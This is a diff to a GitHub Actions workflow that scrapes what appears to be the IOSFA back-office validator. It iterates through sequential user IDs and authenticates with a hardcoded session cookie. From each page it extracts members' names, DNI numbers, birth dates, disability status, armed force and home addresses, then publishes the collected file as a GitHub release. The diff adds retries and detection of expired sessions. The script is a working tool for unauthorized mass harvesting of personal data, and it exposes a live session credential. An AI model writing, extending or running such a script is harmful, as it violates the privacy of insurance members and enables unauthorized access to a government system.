@@ -1,4 +1,4 @@
-name: Scraping IOSFA
+name: Scraping IOSFA PRO
 
 on:
   workflow_dispatch:
@@ -24,53 +24,87 @@ jobs:
     runs-on: ubuntu-latest
     env:
       OUTPUT: resultado.txt
+      ERROR_LOG: errores.txt
 
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
 
-      - name: Run IOSFA scraping
+      - name: Scraping IOSFA PRO
         shell: bash
         run: |
+          set +e
+
           START=${{ github.event.inputs.start_user }}
           END=${{ github.event.inputs.end_user }}
 
-          # 🔐 COOKIES INSERTADAS DIRECTAMENTE
+          > "$OUTPUT"
+          > "$ERROR_LOG"
+
           COOKIE_HEADER='_gid=GA1.3.2022856683.1771469080; _ga_56029ZBE95=GS2.1.s1771555226$o2$g0$t1771556191$j60$l0$h0; IOSFABackOffice=4368BAD61229F777A3023C951E4620667C6B200FA8E8B28E41124A4D06D59C73AD8FE86E76EB21A44E77FEE334D71C582094EC148D579B56BD76E883CEFA2ABF9D0C30A3FC12C46E3F2B41EF5CB5F2000D361A67851002F1FCB5C1059B3FC59DEB944F04; ASP.NET_SessionId=x4weqd2ynqjb1r4tpyp0tpiu'
 
-          echo "Iniciando scraping desde USER $START hasta USER $END"
-          > "$OUTPUT"
-
           extract_input() {
-            echo "$RESPONSE" | grep -oP "$1\"[^>]*value=\"\K[^\"]+" | head -n1
-          }
-
-          extract_span_by_id() {
-            echo "$RESPONSE" | grep -oP "$1\"[^>]*>.*?</span>" | \
-            grep -oP '>\K[^<]+' | head -n1
+            echo "$RESPONSE" | grep -oP "$1\"[^>]*value=\"\K[^\"]+" 2>/dev/null | head -n1
           }
 
           extract_nested_estado() {
-            echo "$RESPONSE" | grep -oP 'frmCabecera_txtEstado[^>]*>.*?estado[^>]*>\K[^<]+' | head -n1
+            echo "$RESPONSE" | grep -oP 'frmCabecera_txtEstado[^>]*>.*?estado[^>]*>\K[^<]+' 2>/dev/null | head -n1
           }
+
+          extract_span() {
+            echo "$RESPONSE" | grep -oP "$1[^>]*>\K[^<]+" 2>/dev/null | head -n1
+          }
+
+          fetch_user() {
+            local USER_ID=$1
+            local ATTEMPT=1
+            local MAX_ATTEMPTS=3
+
+            while [ $ATTEMPT -le $MAX_ATTEMPTS ]; do
+              echo "Intento $ATTEMPT para USER $USER_ID"
+
+              RESPONSE=$(curl -s -L \
+                -H "User-Agent: Mozilla/5.0" \
+                -H "Cookie: $COOKIE_HEADER" \
+                --max-time 20 \
+                "http://validador.iosfa.gob.ar:5080/Afiliados/Titular/Editar/${USER_ID}")
+
+              # Detectar sesión caída
+              if [[ "$RESPONSE" == *"login"* ]] || [[ "$RESPONSE" == *"Login"* ]]; then
+                echo "⚠️ SESION EXPIRADA detectada en USER $USER_ID" | tee -a "$ERROR_LOG"
+                return 2
+              fi
+
+              # Detectar respuesta válida
+              if [[ "$RESPONSE" == *"FUERZA DE ORIGEN:"* ]]; then
+                return 0
+              fi
+
+              ATTEMPT=$((ATTEMPT+1))
+              sleep 2
+            done
+
+            return 1
+          }
+
+          echo "Iniciando scraping desde USER $START hasta USER $END"
 
           for USER_ID in $(seq $START $END); do
             echo "Procesando USER $USER_ID"
 
-            URL="http://validador.iosfa.gob.ar:5080/Afiliados/Titular/Editar/${USER_ID}"
+            fetch_user $USER_ID
+            STATUS=$?
 
-            RESPONSE=$(curl -s -L "$URL" \
-              -H "User-Agent: Mozilla/5.0" \
-              -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
-              -H "Accept-Language: es-419,es;q=0.9" \
-              -H "Cookie: $COOKIE_HEADER" \
-              --max-time 20) || true
+            if [ $STATUS -eq 2 ]; then
+              echo "DETENIDO: sesión inválida." >> "$ERROR_LOG"
+              exit 1
+            fi
 
-            if [[ -z "$RESPONSE" ]] || [[ "$RESPONSE" != *"FUERZA DE ORIGEN:"* ]]; then
+            if [ $STATUS -eq 1 ]; then
               echo "USER $USER_ID = SIN DATOS" >> "$OUTPUT"
               continue
             fi
 
+            # Extraer datos
             TIPO=$(extract_input "cboTipoDocumentos_I")
             APELLIDO=$(extract_input "frmCabecera_txtApellidos")
             NOMBRE=$(extract_input "frmCabecera_txtNombres")
@@ -86,21 +120,19 @@ jobs:
             LOCALIDAD=$(extract_input "cboLocalidad_I")
             CALLE=$(extract_input "txtCalle")
             NUMERO=$(extract_input "frmDomicilio_txtNumero")
-
-            FUERZA=$(extract_span_by_id "afiFA")
+            FUERZA=$(extract_span "afiFA")
             ESTADO=$(extract_nested_estado)
 
-            LINE="USER=$USER_ID | TIPO=$TIPO | ESTADO=$ESTADO | APELLIDO=$APELLIDO | NOMBRE=$NOMBRE | CODIGO=$CODIGO | DNI=$DNI | ESTADO_CIVIL=$ESTADO_CIVIL | EDAD=$EDAD | FECHA_NAC=$FECHA_NAC | DISCAPACIDAD=$DISCAPACIDAD | FUERZA=$FUERZA | VIGENCIA=$VIGENCIA | ALTA_ADMIN=$ALTA_ADMIN | PROVINCIA=$PROVINCIA | LOCALIDAD=$LOCALIDAD | CALLE=$CALLE | NUMERO=$NUMERO"
-
-            echo "$LINE" >> "$OUTPUT"
+            echo "USER=$USER_ID | TIPO=$TIPO | ESTADO=$ESTADO | APELLIDO=$APELLIDO | NOMBRE=$NOMBRE | CODIGO=$CODIGO | DNI=$DNI | ESTADO_CIVIL=$ESTADO_CIVIL | EDAD=$EDAD | FECHA_NAC=$FECHA_NAC | DISCAPACIDAD=$DISCAPACIDAD | FUERZA=$FUERZA | VIGENCIA=$VIGENCIA | ALTA_ADMIN=$ALTA_ADMIN | PROVINCIA=$PROVINCIA | LOCALIDAD=$LOCALIDAD | CALLE=$CALLE | NUMERO=$NUMERO" >> "$OUTPUT"
           done
 
-      - name: Crear release y subir archivo
+      - name: Crear release y subir archivos
         uses: softprops/action-gh-release@v1
         with:
           tag_name: ${{ github.event.inputs.release_name }}
           name: ${{ github.event.inputs.release_name }}
-          body: "Resultados del scraping IOSFA"
-          files: resultado.txt
+          files: |
+            resultado.txt
+            errores.txt
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
